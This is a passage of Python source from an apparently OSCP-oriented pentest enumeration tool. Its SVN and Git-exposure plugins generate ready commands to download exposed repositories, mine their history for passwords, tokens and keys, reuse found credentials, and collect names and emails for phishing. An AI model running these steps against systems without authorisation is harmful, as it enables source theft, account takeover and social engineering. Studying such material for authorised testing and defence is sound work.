                    'Find credentials: grep -r "api_key\\|token\\|secret" ./svn-repo',
                    'Review configs: cat ./svn-repo/config/*',
                    'Check old revisions: cd ./svn-repo && svn up -r 2'
                ],
                'alternatives': [
                    'Export without .svn metadata: svn export svn://{target} ./svn-export',
                    'Specific revision: svn checkout -r 10 svn://{target}',
                    'Specific path: svn checkout svn://{target}/trunk/app'
                ],
                'notes': 'Checkout includes full revision history in .svn/ directory. Even if credentials were deleted in latest revision, they exist in history. Use "svn up -r <old_rev>" to restore old files.',
                'estimated_time': '3-10 minutes depending on repo size'
            }
        })

        # Task 5: Navigate revisions
        tasks['children'].append({
            'id': f'svn-revisions-{port}',
            'name': 'Navigate to Specific Revision',
            'type': 'command',
            'metadata': {
                'command': f'cd ./svn-repo && svn up -r 2',
                'description': 'Update working copy to specific historical revision',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'flag_explanations': {
                    'up': 'Update working copy',
                    '-r': 'Specify revision number',
                    '2': 'Revision number (r2 = second commit)'
                },
                'success_indicators': [
                    'Updated to revision 2',
                    'Files restored to historical state',
                    'Old credentials/configs now visible'
                ],
                'failure_indicators': [
                    'Revision does not exist',
                    'Working copy not checked out'
                ],
                'next_steps': [
                    'Search each revision for secrets',
                    'Compare revisions: svn diff -r 1:2',
                    'Automate: for i in {1..10}; do svn up -r $i && grep -r password .; done'
                ],
                'alternatives': [
                    'View file at revision: svn cat -r 2 config.php',
                    'Diff specific file: svn diff -r 1:2 database.yml',
                    'Show changes: svn log --diff -r 2'
                ],
                'notes': 'Developers often commit credentials in early revisions then delete them. Always check first 5-10 revisions. Look for .env, config.php, database.yml, secrets.json.',
                'estimated_time': '5-10 minutes for thorough review'
            }
        })

        return tasks


@ServiceRegistry.register
class GitExposedPlugin(ServicePlugin):
    """Git repository exposure enumeration plugin (web-based)"""

    @property
    def name(self) -> str:
        return "git-exposed"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect web services (Git detection happens during web enumeration)
        Note: This plugin activates for HTTP/HTTPS to check for .git exposure
        """
        service = port_info.get('service', '').lower()

        # Activate for any HTTP service to check for Git exposure
        if any(keyword in service for keyword in ['http', 'www', 'web']):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Git exposure enumeration task tree"""

        # Determine protocol
        ssl_ports = [443, 8443]
        protocol = 'https' if port in ssl_ports else 'http'
        base_url = f'{protocol}://{target}:{port}'

        tasks = {
            'id': f'git-exposed-enum-{port}',
            'name': f'Git Repository Exposure Check (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: Check for .git directory
        tasks['children'].append({
            'id': f'git-check-exposed-{port}',
            'name': 'Check for Exposed .git Directory',
            'type': 'command',
            'metadata': {
                'command': f'curl -s -o /dev/null -w "%{{http_code}}" {base_url}/.git/HEAD',
                'description': 'Test if .git directory is publicly accessible',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'WEB_ENUM'],
                'flag_explanations': {
                    'curl': 'HTTP client tool',
                    '-s': 'Silent mode (no progress bar)',
                    '-o /dev/null': 'Discard response body',
                    '-w "%{http_code}"': 'Print only HTTP status code',
                    '/.git/HEAD': 'Git repository metadata file'
                },
                'success_indicators': [
                    'HTTP 200 (file accessible)',
                    'HTTP 301/302 (redirects but file exists)',
                    'Response contains "ref: refs/heads/"'
                ],
                'failure_indicators': [
                    'HTTP 404 (not found)',
                    'HTTP 403 (forbidden - server blocks .git)',
                    'HTTP 401 (requires authentication)'
                ],
                'next_steps': [
                    'If 200: Download repository with git-dumper',
                    'If 403: Try other files (.git/config, .git/index)',
                    'If 404: Check for .svn, .hg, CVS exposure',
                    'Test common paths: /.git/logs/HEAD, /.git/refs/heads/master'
                ],
                'alternatives': [
                    'Manual browser: Visit {base_url}/.git/HEAD',
                    'Nmap NSE: nmap --script http-git {target}',
                    'Gobuster: gobuster dir -u {base_url} -w /usr/share/wordlists/dirb/common.txt -x git',
                    'wget: wget -r {base_url}/.git (if directory listing enabled)'
                ],
                'notes': 'Common misconfiguration: Developers deploy web root with .git/ included. Allows full source code download including commit history with secrets.',
                'estimated_time': '30 seconds'
            }
        })

        # Task 2: Download .git repository
        tasks['children'].append({
            'id': f'git-dumper-{port}',
            'name': 'Download .git Repository (git-dumper)',
            'type': 'command',
            'metadata': {
                'command': f'git-dumper {base_url}/.git ./git-dump',
                'description': 'Extract full Git repository from exposed .git directory',
                'tags': ['OSCP:HIGH', 'DATA_EXFIL'],
                'flag_explanations': {
                    'git-dumper': 'Tool to download exposed Git repos (github.com/arthaud/git-dumper)',
                    f'{base_url}/.git': 'URL of exposed .git directory',
                    './git-dump': 'Local destination directory'
                },
                'success_indicators': [
                    'Files downloaded successfully',
                    'Repository reconstructed',
                    'Commit history available'
                ],
                'failure_indicators': [
                    '.git directory not accessible',
                    'Incomplete download (missing objects)',
                    'Directory listing disabled (harder to download)'
                ],
                'next_steps': [
                    'Review source code: cd ./git-dump && ls -la',
                    'Check commit history: git log',
                    'Search for secrets: grep -r "password\\|api_key\\|token" .',
                    'Inspect .git/config for remote URLs, credentials'
                ],
                'alternatives': [
                    'wget: wget -r {base_url}/.git (if directory listing on)',
                    'GitTools: ./gitdumper.sh {base_url}/.git ./git-dump',
                    'Manual: Download .git/HEAD, .git/config, .git/objects/, .git/refs/',
                    'DVCS-Pillage: dvcs-pillage {base_url}/.git'
                ],
                'notes': 'Install git-dumper: pip3 install git-dumper. Tool reconstructs repository even when directory listing is disabled by brute-forcing object hashes.',
                'estimated_time': '2-5 minutes'
            }
        })

        # Task 3: Analyze commit history
        tasks['children'].append({
            'id': f'git-history-analysis-{port}',
            'name': 'Analyze Commit History for Secrets',
            'type': 'command',
            'metadata': {
                'command': f'cd ./git-dump && git log --all --oneline && git diff HEAD~1',
                'description': 'Review commits for accidentally committed secrets',
                'tags': ['OSCP:HIGH', 'RESEARCH'],
                'flag_explanations': {
                    'git log': 'Show commit history',
                    '--all': 'Show all branches',
                    '--oneline': 'Compact format (one line per commit)',
                    'git diff': 'Show changes between commits',
                    'HEAD~1': 'Previous commit (compare with current)'
                },
                'success_indicators': [
                    'Commit messages visible',
                    'Diffs show added/removed secrets',
                    'Sensitive files found in history'
                ],
                'failure_indicators': [
                    'Repository empty',
                    'No sensitive commits found',
                    'History rewritten (git filter-branch used)'
                ],
                'next_steps': [
                    'Search all commits: git log -p | grep -i password',
                    'Automated scanning: trufflehog git file://./git-dump',
                    'Check specific files: git show <commit>:config/database.yml',
                    'List deleted files: git log --diff-filter=D --summary'
                ],
                'alternatives': [
                    'TruffleHog: trufflehog git file://./git-dump',
                    'git-secrets: git secrets --scan',
                    'GitLeaks: gitleaks detect --source ./git-dump',
                    'Manual grep: git log -p | grep -E "(password|api_key|secret|token)"'
                ],
                'notes': 'Developers often commit secrets then delete them in next commit. Check all history, not just latest. Look for: .env files, config/database.yml, secrets.json, API keys in code comments.',
                'estimated_time': '5-10 minutes'
            }
        })

        # Task 4: Automated secret scanning
        tasks['children'].append({
            'id': f'git-secret-scanning-{port}',
            'name': 'Automated Secret Scanning (TruffleHog)',
            'type': 'command',
            'metadata': {
                'command': f'trufflehog git file://$(pwd)/git-dump --only-verified',
                'description': 'Scan Git history for high-entropy strings and verified secrets',
                'tags': ['OSCP:HIGH', 'AUTOMATED'],
                'flag_explanations': {
                    'trufflehog': 'Secret scanner for Git repos',
                    'git': 'Scan Git repository',
                    'file://': 'Local file path protocol',
                    '--only-verified': 'Show only verified secrets (reduces false positives)'
                },
                'success_indicators': [
                    'Secrets found and verified',
                    'AWS keys, GitHub tokens, private keys detected',
                    'High-entropy strings identified'
                ],
                'failure_indicators': [
                    'No secrets found',
                    'All findings are false positives',
                    'Tool errors on malformed commits'
                ],
                'next_steps': [
                    'Test found credentials immediately',
                    'Document all findings with commit hashes',
                    'Check if credentials still valid',
                    'Search for additional secrets in code: grep -r pattern .'
                ],
                'alternatives': [
                    'GitLeaks: gitleaks detect --source ./git-dump',
                    'git-secrets: git secrets --scan',
                    'repo-security-scanner: repo-security-scanner ./git-dump',
                    'Manual: git log -p | grep -E "BEGIN (RSA|OPENSSH) PRIVATE KEY"'
                ],
                'notes': 'Install TruffleHog: pip3 install trufflehog. Scan finds: AWS keys, API tokens, SSH private keys, database passwords, JWT secrets. Verify ALL findings - many are test data.',
                'estimated_time': '3-5 minutes'
            }
        })

        # Task 5: Extract .git/config for credentials
        tasks['children'].append({
            'id': f'git-config-creds-{port}',
            'name': 'Extract Credentials from .git/config',
            'type': 'command',
            'metadata': {
                'command': f'curl -s {base_url}/.git/config',
                'description': 'Check Git config for remote URLs with embedded credentials',
                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                'flag_explanations': {
                    'curl': 'HTTP client',
                    '-s': 'Silent mode',
                    '/.git/config': 'Git configuration file (may contain remote URLs with credentials)'
                },
                'success_indicators': [
                    'Config file downloaded',
                    'Remote URL contains username:password',
                    'Example: https://user:pass@github.com/repo.git'
                ],
                'failure_indicators': [
                    'HTTP 404 (file not accessible)',
                    'No credentials in remotes',
                    'Config file empty'
                ],
                'next_steps': [
                    'Test credentials against remote repository',
                    'Use credentials for GitHub/GitLab access',
                    'Check for other sensitive config: git config --list',
                    'Look for user.name, user.email (for phishing/social engineering)'
                ],
                'alternatives': [
                    'Local: cat ./git-dump/.git/config',
                    'wget: wget {base_url}/.git/config',
                    'Parse: grep "url = " .git/config | grep "@"'
                ],
                'notes': 'Developers sometimes hardcode credentials in remote URLs. Format: https://username:password@host/repo.git or git@host:repo.git (uses SSH keys).',
                'estimated_time': '1 minute'
            }
        })

        # Task 6: Additional tools
        tasks['children'].append({
            'id': f'git-additional-tools-{port}',
            'name': 'Additional Git Enumeration Tools',
            'type': 'manual',
            'metadata': {
                'description': 'Other tools for Git repository analysis',
                'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                'alternatives': [
                    'GitKraken (GUI): Visual inspection of commit tree, branches, diffs',
                    'git-vuln-finder: Search commits for CVE/vulnerability keywords',
                    'Gitrob: Scan GitHub org repos for sensitive data (requires API key)',
                    'Git-Money: Automated .git downloader with commit analysis',
                    'DVCS-Pillage: Download .git, .svn, .hg, .bzr exposed repos',
                    'repo-security-scanner: GitHub secret scanner (for organization repos)'
                ],
                'next_steps': [
                    'Install: sudo apt install gitrob git-money',
                    'GitHub dorking: site:github.com "company_name" password',
                    'Search commits: git log --all -S "password" -p',
                    'Check branches: git branch -a && git checkout <branch>'
                ],
                'notes': 'For GitHub/GitLab organizations: Use Gitrob to scan all employee repositories. GitHub dorking finds public repos with exposed secrets. Always check ALL branches, not just master/main.'
            }
        })

        return tasks
